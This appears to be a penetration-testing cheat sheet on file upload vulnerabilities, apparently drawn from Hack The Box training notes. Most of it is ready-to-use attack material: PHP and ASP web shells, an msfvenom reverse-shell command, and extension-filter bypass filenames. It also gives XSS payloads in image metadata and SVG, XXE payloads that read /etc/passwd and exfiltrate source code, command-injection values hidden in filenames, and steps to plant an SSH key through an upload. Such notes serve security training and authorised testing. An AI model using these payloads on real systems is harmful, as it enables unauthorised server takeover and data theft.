# File Uploads

## **Introduction**

> Uploading user files has become a key feature for most modern web applications. File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications.\
> \
> If users' data is not correctly filtered and validated, attackers may store malicious data on the back-end server and exploit the file upload feature to execute arbitrary files on that server

***

## **File Types and Related Attacks**

| File Types              | Potential Attack |
| ----------------------- | ---------------- |
| HTML, JS, SVG, GIF      | XSS              |
| XML, SVG, PDF, PPT, DOC | XXE/SSRF         |
| ZIP, JPG, PNG           | DoS              |

***

## **Web and Reverse Shells Payloads to Inject**

| Web Shell                                                                      | Description                           |
| ------------------------------------------------------------------------------ | ------------------------------------- |
| `<?php file_get_contents('/etc/passwd'); ?>`                                   | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                                                 | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                                           | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                                                    | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell            |
| `https://github.com/Arrexel/phpbash`                                           | PHP Web Shell                         |
| `https://github.com/pentestmonkey/php-reverse-shell`                           | PHP Reverse Shell                     |
| `https://github.com/danielmiessler/SecLists/tree/master/Web-Shells`            | List of Web Shells and Reverse Shells |

***

## **Blacklist filter Bypasses**

| Command                             | Description                                  |
| ----------------------------------- | -------------------------------------------- |
| `shell.phtml`                       | Uncommon Extension                           |
| `shell.pHp`                         | Case Manipulation                            |
| `shell.jpg.php`                     | Double Extension                             |
| `shell.php.jpg`                     | Reverse Double Extension                     |
| `%20, %0a, %00, %0d0a, /, .\, ., …` | Character Injection - Before/After Extension |

**External Resources:**

1. [List of PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
2. [List of ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
3. [List of Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

***

## **Content/Type and Mime/Type Bypass**

1. [List of All Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
2. [List of File Signatures/Magic Bytes](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)

***

## **File Uploads to XSS Attack**

There are different cases in which you can gain XSS from file uploads:

1. Uploading a HTML file containing a script in javascript
2. Uploading a HTML file containing a link to our server to steal the document cookie

Other cases:

1. Whenever an application shows an image's metadata after its upload, it is possible to inject a payload inside metadata parameters such as `comment` or `artist` by using `exiftool`:
   * `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`
2. By using SVG images, it's possible to inject a payload with something like:
   * `<script type="text/javascript"> alert("window.origin");</script>`

***

## File Upload to SSH Access

Suppose you have an Arbitrary File Upload vulnerability where you can also specify the uploaded file's location, whether via a vulnerable filename or a path parameter. Also suppose that you have write access on SSH's authorized\_keys file for a local user.

You can gain an SSH shell using the following:

1. Use `ssh-keygen` to generate a key named `fileup`
2. cat fileup > authorized\_keys
3. Upload the file to `/home/username/.ssh/authorized_keys` (or `/root/.ssh/authorized_keys`).
4. Note that  you might need to leverage a path traversal vulnerability to reach these destinations.
5. Use `ssh username@IP -i fileup` to gain the SSH shell as `username`
6. Notice that SSH might require using `chmod 500 fileup` to use the `-i fileup` option

***

## **File Uploads to XXE Attacks**

1.  \[Read `/etc/passwd`] XXE from SVG images upload by using the following payload:

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <svg>&xxe;</svg>
    ```
2.  \[Exfiltrate PHP Code] XXE from SVG to read source code:

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]> 
    <svg>&xxe;</svg>
    ```

***

## **Injections in File Names**

> * A common file upload attack uses a malicious string for the uploaded file name
> * The filename may get executed or processed if the uploaded file name is reflected on the page.
> * We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack.
> * Some examples of filenames for this attack:

1. System Command Execution
   * `file$(whoami).jpg`
   * `file`whoami`.jpg`
   * `file.jpg||whoami`
2. XSS from filename:
   * `<script>alert(window.origin);</script>`
3. SQLi from filename:
   * `file';select+sleep(5);--.jpg`

***

## **Windows Specific Attacks**

1. **Reserved Characters:** such as (`|`, `<`, `>`, `*`, or `?`) are characters for special uses (such as wildcards).
   * If the web application doesn't apply any form of input sanification, it's possible to refer to a file different from the specified one (which does not exist)
   * This behaviour causes an error which may be shown on the web application, potentially showing the `upload directory`
2. **Windows Reserved Names:** can be used to replicate the same behaviour as the reserved characters previously shown. (`CON`, `COM1`, `LPT1`, or `NUL`)
3. **Windows Filename Convention:** it's possible to overwrite a file (or refer to a non-existant file) by using the `~` character to complete the filename
   * Example: `HAC~1.TXT` → may refer to hackthebox.txt
   * Reference: [https://en.wikipedia.org/wiki/8.3\_filename](https://en.wikipedia.org/wiki/8.3\_filename)
